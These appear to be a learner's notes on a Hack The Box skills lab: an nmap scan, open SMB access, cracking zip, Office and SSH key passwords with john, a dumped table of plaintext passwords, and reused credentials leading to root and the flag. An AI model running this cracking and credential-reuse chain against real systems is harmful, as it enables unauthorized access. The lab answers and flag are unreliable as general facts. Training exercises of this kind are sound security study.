### Nmap Scan Results
```nmap
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-12 09:14 EDT
Nmap scan report for 10.129.219.12
Host is up (0.069s latency).
Not shown: 977 closed tcp ports (reset)
PORT      STATE    SERVICE        VERSION
22/tcp    open     ssh            OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3f:4c:8f:10:f1:ae:be:cd:31:24:7c:a1:4e:ab:84:6d (RSA)
|   256 7b:30:37:67:50:b9:ad:91:c0:8f:f7:02:78:3b:7c:02 (ECDSA)
|_  256 88:9e:0e:07:fe:ca:d0:5c:60:ab:cf:10:99:cd:6c:a7 (ED25519)
139/tcp   open     netbios-ssn    Samba smbd 4.6.2
445/tcp   open     netbios-ssn    Samba smbd 4.6.2
1022/tcp  filtered exp2
1058/tcp  filtered nim
1076/tcp  filtered sns_credit
1300/tcp  filtered h323hostcallsc
1972/tcp  filtered intersys-cache
2007/tcp  filtered dectalk
2068/tcp  filtered avocentkvm
2121/tcp  filtered ccproxy-ftp
3052/tcp  filtered powerchute
3404/tcp  filtered unknown
3703/tcp  filtered adobeserver-3
3814/tcp  filtered neto-dcs
3905/tcp  filtered mupdate
5101/tcp  filtered admdog
5825/tcp  filtered unknown
6005/tcp  filtered X11:5
8010/tcp  filtered xmpp
15004/tcp filtered unknown
27353/tcp filtered unknown
65389/tcp filtered unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2024-04-12T13:15:36
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: SKILLS-MEDIUM, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_clock-skew: 4s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.87 seconds
```

### Getting Access to SMB

SMB can be accessed with any username and password, got Docs.zip file, the file is protected by a password

### Getting the Password of the File
```shell-session
# zip2john Docs.zip > docs.hash
# john --wordlist=../mut_password.list docs.hash
```

Got the password: Destiny2022!

Inside the archive there is another file documentation.docx protected by a passord

### Getting the Password to the File
```shell-session
# office2john Documentation.zip > document.hash
# john --wordlist=../mut_password.list document.hash
```

Got the password: 987654321

### Found Credentials inside the file
![[Pasted image 20240412165615.png]]

jason:C4mNKjAtL2dydsYa6

### creds Table from MySQL
```shell-session
+-----+--------------------+----------------+
| id  | name               | password       |
+-----+--------------------+----------------+
|   1 | Hiroko Monroe      | YJE25AGN4CX    |
|   2 | Shelley Levy       | GOK34QLM1DT    |
|   3 | Uriel Velez        | OAY05YXS1XN    |
|   4 | Vanna Benton       | EAU86WAY1BY    |
|   5 | Philip Morales     | ONC53GFI2ID    |
|   6 | Joshua Morgan      | AHJ46CDW4LH    |
|   7 | Hadley Hanson      | YVD16TIY3QI    |
|   8 | Branden Moses      | ZBE71RLJ5HN    |
|   9 | Pandora Sears      | WYP33WEF5GY    |
|  10 | Orla Lambert       | MLZ15XKR8SF    |
|  11 | Maite Moran        | FOS06OOU2DF    |
|  12 | Cassandra Mccarthy | SIB53CEH5DE    |
|  13 | Leroy Sullivan     | HIC68RBH5EI    |
|  14 | Wyoming Quinn      | LJM77SJC6BN    |
|  15 | Asher Wise         | HHP00OHN8OD    |
|  16 | Shelby Garrison    | SOI55QEP2QC    |
|  17 | Garth Landry       | YOX30FPX2UK    |
|  18 | Cailin Lang        | VYE12SKJ3BG    |
|  19 | Tyrone Gross       | GCM52PLH8LH    |
|  20 | Moana Bernard      | EMK37PGI1BC    |
|  21 | Nell Forbes        | YXY78WCW4GX    |
|  22 | Acton Mccormick    | RSI82CFW9QR    |
|  23 | Odessa Knapp       | CXR22UOP5PV    |
|  24 | Gary Phelps        | KDN93TNB6IB    |
|  25 | Jonah Byrd         | GWK11PET1YK    |
|  26 | Lewis Clements     | ACJ89KMH8IX    |
|  27 | Hasad Dejesus      | GSH56VRQ3FD    |
|  28 | Naomi Guerra       | YJY12IMO3YJ    |
|  29 | Renee Levine       | UAT22NOU6JJ    |
|  30 | Dieter Terry       | KPE74PKB7BE    |
|  31 | Lucas Cooper       | JQY67QCL3SG    |
|  32 | Reece Cherry       | TGV05UOE4MW    |
|  33 | Len Olsen          | SQT66ETU2ML    |
|  34 | Amir Booth         | SNA73SNK1CZ    |
|  35 | Logan Burnett      | BDY84TGX7WC    |
|  36 | Quinn Mcintyre     | UEL46HQC8PI    |
|  37 | Harding Garrison   | MUT33ERW8PN    |
|  38 | Addison Ellison    | RYR75LXH4WI    |
|  39 | Anne Rose          | IOI62GUK7KK    |
|  40 | Alika Richmond     | GUK64BKH7NJ    |
|  41 | Kennan Hopkins     | AKE20VJV3TK    |
|  42 | Katell Pace        | KDK46LGC3TS    |
|  43 | Shoshana Murray    | TDX83THW8CG    |
|  44 | Erasmus Brewer     | MBN41SYM4SC    |
|  45 | Lewis Bryan        | DDI16XVP2LF    |
|  46 | Yoko Bryan         | ISE37BPH4HE    |
|  47 | Karleigh York      | JYU77OSI6XM    |
|  48 | Brennan Nelson     | LUM81UWX3EX    |
|  49 | Quintessa Hughes   | OCE13YLK4YU    |
|  50 | Clinton Pugh       | LYM63FLG3WJ    |
|  51 | Aaron Duncan       | EXI67QKU1DV    |
|  52 | Rebekah Boyle      | TSU58EWW7AV    |
|  53 | Inga Pickett       | LBI88TBG8FG    |
|  54 | Nelle Harmon       | SCS45PQE2SF    |
|  55 | Lee Hendrix        | WCF07LWQ7DI    |
|  56 | Zane Reid          | WHM08PCI6YJ    |
|  57 | Neil Santos        | VFP69WHB8QJ    |
|  58 | Hilda Cameron      | ECP57KJV6GF    |
|  59 | Kasper Franklin    | CUB01RJE1TV    |
|  60 | Lamar Ellison      | ECD63FEI7EC    |
|  61 | Oliver Collier     | UAK54DNB5NU    |
|  62 | Jeanette Stewart   | HCY40SWK4TS    |
|  63 | Dean Hale          | FYX44JDS3FW    |
|  64 | Jasper Walter      | UHE24MXN7UY    |
|  65 | Tasha Nguyen       | LIC48RCT5XL    |
|  66 | Hamilton Lynch     | DBL85UPK4WA    |
|  67 | Mariko Harris      | VSH42HZG2NI    |
|  68 | Caleb Wooten       | RQK77XPZ3UM    |
|  69 | Adele Glenn        | CEH74EIK1HP    |
|  70 | Alvin Lambert      | IYI54DJF1VW    |
|  71 | Barbara Roman      | TYV58TDS0VW    |
|  72 | Naida Arnold       | SLS89ENT3CE    |
|  73 | Rebekah Alexander  | YRR18NTB0SI    |
|  74 | Chava Durham       | CRO01QSG2QS    |
|  75 | Ainsley Pittman    | HYY51CZI5IP    |
|  76 | Danielle Howell    | MGQ65TBI1IH    |
|  77 | Cairo Dale         | QKY37WGY6PK    |
|  78 | Kathleen Fulton    | QWA22ZTE7FK    |
|  79 | Kelsie Mcpherson   | BQP07JMR6HP    |
|  80 | Bevis Herman       | SOR60URB2NJ    |
|  81 | Mufutau Baldwin    | QBB25FTD7HV    |
|  82 | Genevieve Ryan     | KON69QNC5UQ    |
|  83 | Lucius Wall        | JVX56EQT7YI    |
|  84 | Cassidy Gutierrez  | KLZ78QIH6KH    |
|  85 | Aladdin Fisher     | KYS21TWU3GS    |
|  86 | Paul Lancaster     | WDW24NGN8KA    |
|  87 | Jael Roberts       | MML82LOC4FN    |
|  88 | Zena Solomon       | DJN31MHH6UV    |
|  89 | Josephine Garza    | UWZ57ZKM1IV    |
|  90 | Jason Norman       | ISO35HVC2BW    |
|  91 | Rajah Ellison      | TIY46YPJ5TA    |
|  92 | Colt Ferrell       | YCX56EKU9QO    |
|  93 | Brenna Kinney      | FGD21LBQ6IS    |
|  94 | Valentine Mcdowell | XIP27KBN6KL    |
|  95 | Alexander Keith    | CJT35RAJ7DC    |
|  96 | Charles Bell       | FAG53RFK7TH    |
|  97 | Justina Greer      | YPG28SUE4JD    |
|  98 | Elton Wallace      | SGH05RBW1YL    |
|  99 | Jamalia Byers      | KVE47IWE5UF    |
| 100 | Lael Rivers        | YNQ63NWP1RD    |
| 101 | dennis             | 7AUgWWQEiMPdqx |
+-----+--------------------+----------------+
```

Switched user to dennis using the password in the last row.

From history we can see that dennis uses SSH key.

### Finding the Passphrase for the SSH key
```shell-session
# ssh2john id_rsa > rsa.hash
# john --wordlist=../mut_password.list rsa.hash
```

Found the password: P@ssw0rd12020!

Managed to get root using the key and the password

### Getting the hash
![[Pasted image 20240412172101.png]]

HTB{PeopleReuse_PWsEverywhere!}